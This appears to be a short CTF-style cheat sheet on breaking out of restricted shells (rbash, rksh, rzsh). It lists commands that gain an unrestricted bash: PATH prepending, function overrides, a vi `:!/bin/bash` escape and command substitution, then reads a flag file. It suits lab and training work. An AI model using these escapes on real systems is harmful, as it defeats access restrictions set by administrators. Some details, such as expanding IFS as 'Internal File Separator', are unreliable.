
[Restricted Bourne shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html) (`rbash`) 
Restricted version of the Bourne shell.

[Restricted Korn shell](https://www.ibm.com/docs/en/aix/7.2?topic=r-rksh-command) (`rksh`)
Restricted version of the Korn shell.

[Restricted Z shell](https://manpages.debian.org/experimental/zsh/rzsh.1.en.html) (`rzsh`)
Restricted version of the Z shell and is the most powerful and flexible command-line interpreter.

---
## Escasping

```sh
compgen -c ### checks which commands are available

ls -l `pwd` ### we can inject commands in ls with -l
ls -l (pwd) ### if you got a fish shell isntead


## Command Chaining 

ls -l; pwd ### execute pwd after ls, we can use (';', '|', '&&', '||')


## Environment Variables 

export PATH=/bin:${PATH} ### prepend /bin to PATH
bash ### if bash is now found in PATH  
/bin/bash ### invoke bash directly


## Shell Functions

ls(){ /bin/bash; } ### override ls with a shell function  
ls ### launches /bin/bash


## Editor Escapes

vi ### open vi/vim  
:!/bin/bash ### spawn a bash shell from within vi/vim


## File Operations

printf "%s\n" .* * ### shows all dir or files including hidden

while IFS= read -r line; do  
printf "%s\n" "$line"  
done < flag.txt ### safely read a file line-by-line
```

`IFS` = Internal File Separator, for bash it is space/tab/newline . `-r` prevents backslash escaping.

---